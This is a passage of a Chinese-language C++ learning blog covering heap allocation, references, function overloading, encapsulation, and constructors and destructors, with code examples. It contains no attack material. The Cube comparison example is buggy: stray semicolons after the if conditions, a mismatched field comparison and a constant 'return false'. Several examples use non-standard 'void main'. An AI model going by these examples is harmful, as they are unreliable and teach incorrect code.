class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">addcontacts(arr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">showcontacts(arr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">deletecontacts(arr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">findcontacts(arr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">modifycontact(arr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">deleteallcontacts(arr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;欢迎下次使用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-核心编程"><a href="#C-核心编程" class="headerlink" title="C++核心编程"></a>C++核心编程</h2><h3 id="堆空间的申请与释放"><a href="#堆空间的申请与释放" class="headerlink" title="堆空间的申请与释放"></a>堆空间的申请与释放</h3><p>c采用不同于malloc，free的方式来向堆区申请与释放空间，而c++还可以用new和delete来向堆区申请与释放空间</p><pre><code>#include&lt;iostream&gt;using namespace std;int main()&#123;    int* p = new int(10);    int  i;    cout &lt;&lt; *p &lt;&lt; endl;    delete p;    int* q = new int[10];    for (i = 0; i &lt; 10; i++)    &#123;        q[i] = i;    &#125;    for (i = 0; i &lt; 10; i++)    &#123;        cout &lt;&lt; q[i] &lt;&lt; endl;    &#125;    delete[] q;&#125;</code></pre><h3 id="引用-amp"><a href="#引用-amp" class="headerlink" title="引用&amp;"></a>引用&amp;</h3><p>1.c++中的一个知识点，先通过一个例子来认识引用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span>&amp; b = a;<span class="comment">//表面上就是相当于给a取个别名叫b</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; &amp;b &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; &amp;a &lt;&lt; <span class="built_in">endl</span>;<span class="comment">//会发现两个值是一样的</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们继续通过汇编来看看究竟引用干了什么。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">int a&#x3D;0;</span><br><span class="line">001D2602  mov         dword ptr [a],0  </span><br><span class="line">int&amp; b &#x3D; a;&#x2F;&#x2F;可以看到，这个语句就是将a变量的地址给了b</span><br><span class="line">001D2609  lea         eax,[a]  </span><br><span class="line">001D260C  mov         dword ptr [b],eax  </span><br><span class="line"></span><br><span class="line">b &#x3D; 2;&#x2F;&#x2F;对b进行赋值实际上也是对a在操作</span><br><span class="line">001D260F  mov         eax,dword ptr [b]  </span><br><span class="line">001D2612  mov         dword ptr [eax],2  </span><br></pre></td></tr></table></figure><p>引用&amp;，表面上理解为一种改名操作吧，也是一种特殊的变量类型。</p><p>2.然后就是引用的函数应用了，我们都知道，想要用函数来对两个数的值进行真正的交换要用到指针，可是，在c++里面也可以用引用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>&amp; m, <span class="keyword">int</span>&amp; n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> tmp;</span><br><span class="line">tmp = m;</span><br><span class="line">m = n;</span><br><span class="line">n = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line">swap(a, b);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，传入函数的类型居然和函数设置的不一样了，非常不寻常，还是觉得指针用起舒服，实际上感觉这种还是用到的指针，&amp;m，&amp;n，就是a<br>和b的地址。</p><p>3.返回静态变量引用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>&amp; <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">10</span>;<span class="comment">//定义了一个静态变量，这种变量储存在全局去，程序完成后释放。</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; &amp;a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">re</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span>&amp; tmp = func();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; &amp;tmp &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; &amp;func() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">func() = <span class="number">20</span>;<span class="comment">//可以看到函数返回值也可以赋值了。</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面打印出的地址全是一样的</p><p>4.引用的本质，实际上就是个静态指针，或者说是指针常量，也就是指向不能改变的指针。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a =<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>&amp; b = a;</span><br><span class="line"><span class="keyword">int</span>* <span class="keyword">const</span> p = &amp;a;<span class="comment">//这两个意思是一样，只是语法上有差异。</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>意思就是，我们在写出int&amp; b = a;时，就相当于定义了一个不可修改的指针(int * const p;)，然后让p指向了a的地址。</p><p>5.常量引用，由于常量不可变，而且在全局区，无法直接引用，必须加const。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span>&amp; a = <span class="number">10</span>;<span class="comment">//可以看到这种引用是不行的，对一个常量，不能直接引用。</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>&amp; b = <span class="number">10</span>;<span class="comment">//可以理解为编译器生成了一个变量const int p=10,然后引用了这个p。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数提高"><a href="#函数提高" class="headerlink" title="函数提高"></a>函数提高</h3><p>1.函数默认参数，函数形参可以有默认参数(且从这个默认参数开始都要设置为默认参数)，感觉没啥用样，直接在函数内弄一个变量不就可以了吗。</p><p>2.函数占位参数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">func(<span class="number">10</span>, <span class="number">10</span>);<span class="comment">//调用该函数时一定要将这个占位参数给填充。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.函数重载，就是在满足一定条件下</p><p>函数重载满足条件：</p><ul><li>同一个作用域下</li><li>函数名称相同</li><li>函数参数<strong>类型不同</strong>  或者 <strong>个数不同</strong> 或者 <strong>顺序不同</strong></li></ul><p>注意</p><ul><li>对于有默认参数的函数，别用函数重载</li><li>对于引用时，特别是引用常量，注意有无const。</li></ul><p>感觉没必要啊，改个函数名的事情。</p><h3 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h3><p>终于面向对象了。</p><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><p>封装是C++面向对象三大特性之一</p><p>封装的意义：</p><ul><li>将属性和行为作为一个整体，表现生活中的事物</li><li>将属性和行为加以权限控制</li></ul><p>直接上两个例子，再来说需要注意的点。</p><p>案例1，设计立方体类(Cube)，分别用全局函数和成员函数判断两个立方体是否相等。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cube</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setm_l</span><span class="params">(<span class="keyword">int</span> l)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_l = l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setm_h</span><span class="params">(<span class="keyword">int</span> h)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_h = h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setm_w</span><span class="params">(<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_w = w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getm_l</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> m_l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getm_h</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> m_h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getm_w</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> m_w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_same1</span><span class="params">(Cube tmp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (tmp.m_h == m_h &amp;&amp; tmp.m_l == m_l &amp;&amp; tmp.m_w == m_w);</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;两个立方体一样&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> m_l, m_h, m_w;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_same2</span><span class="params">(Cube c1,Cube c2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (c1.getm_h() == c2.getm_h() &amp;&amp; c1.getm_h() == c2.getm_l()&amp;&amp;c1.getm_w()==c2.getm_w());</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;两个立方体一样&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Cube c1;</span><br><span class="line">c1.setm_h(<span class="number">10</span>);</span><br><span class="line">c1.setm_l(<span class="number">10</span>);</span><br><span class="line">c1.setm_w(<span class="number">10</span>);</span><br><span class="line">Cube c2;</span><br><span class="line">c2.setm_h(<span class="number">10</span>);</span><br><span class="line">c2.setm_l(<span class="number">10</span>);</span><br><span class="line">c2.setm_w(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">c1.is_same1(c2);</span><br><span class="line">is_same2(c1, c2);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>案例2，设计一个圆形类（Circle），和一个点类（Point），计算点和圆的关系。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setx</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_x = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sety</span><span class="params">(<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_y = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getx</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> m_x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gety</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> m_y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> m_x, m_y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setcenter</span><span class="params">(Point ct)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">center = ct;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setr</span><span class="params">(<span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_r = r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Point <span class="title">getcenter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> m_r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">Point center;</span><br><span class="line"><span class="keyword">int</span>  m_r;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(Point p, Circle c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line">d = (c.getcenter().getx() - p.getx()) * (c.getcenter().getx() - p.getx()) +</span><br><span class="line">(c.getcenter().gety() - p.gety()) * (c.getcenter().gety() - p.gety());</span><br><span class="line">r = c.getr() * c.getr();</span><br><span class="line"><span class="keyword">if</span> (d &lt; r)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;在圆内&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (d == r)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;在圆上&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;在圆外&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Point center, point;</span><br><span class="line">Circle yuan;</span><br><span class="line">center.setx(<span class="number">10</span>);</span><br><span class="line">center.sety(<span class="number">20</span>);</span><br><span class="line">point.setx(<span class="number">5</span>);</span><br><span class="line">point.sety(<span class="number">30</span>);</span><br><span class="line">yuan.setcenter(center);</span><br><span class="line">yuan.setr(<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">check(point, yuan);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在来说说封装吧，可以看到在class类中，有三种访问权限</p><ul><li>三种权限</li><li>公共权限  public     类内可以访问  类外可以访问</li><li>保护权限  protected  类内可以访问  类外不可以访问</li><li>私有权限  private    类内可以访问  类外不可以访问</li></ul><p>然后class与我们以前学习的struct很像，但是有一点不同，那就是访问权限，class里面属性的访问权限是默认是private的，而struct是public的。</p><p>对于class的private权限，有两个好处</p><ul><li>将所有成员属性设置为私有，可以自己控制读写权限，就像两个例子里面的一样。</li><li>对于写权限，我们可以检测数据的有效性，比如说写入属性时，必须要满足什么条件，才可以写入。</li></ul><h4 id="对象的初始化和清理"><a href="#对象的初始化和清理" class="headerlink" title="对象的初始化和清理"></a>对象的初始化和清理</h4><p>1.其实讲的就是构造函数和析构函数，实际上就算我们不写构造和析构，编译器也默认会提供空实现(但是构造函数的拷贝函数不是空实现)。</p><ul><li>构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无须手动调用。</li><li>析构函数：主要作用在于对象<strong>销毁前</strong>系统自动调用，执行一些清理工作。</li></ul><p>编译器默认的构造函数和析构函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line">Person()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Person的构造函数调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">Person(<span class="keyword">const</span> Person &amp;p)<span class="comment">//注意这个拷贝，用的是引用，也就是本体，这样就不会在传入形参时又拷贝一份了</span></span><br><span class="line">&#123;</span><br><span class="line">a = p.a;<span class="comment">//拷贝操作</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//析构函数</span></span><br><span class="line">~Person()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Person的析构函数调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span 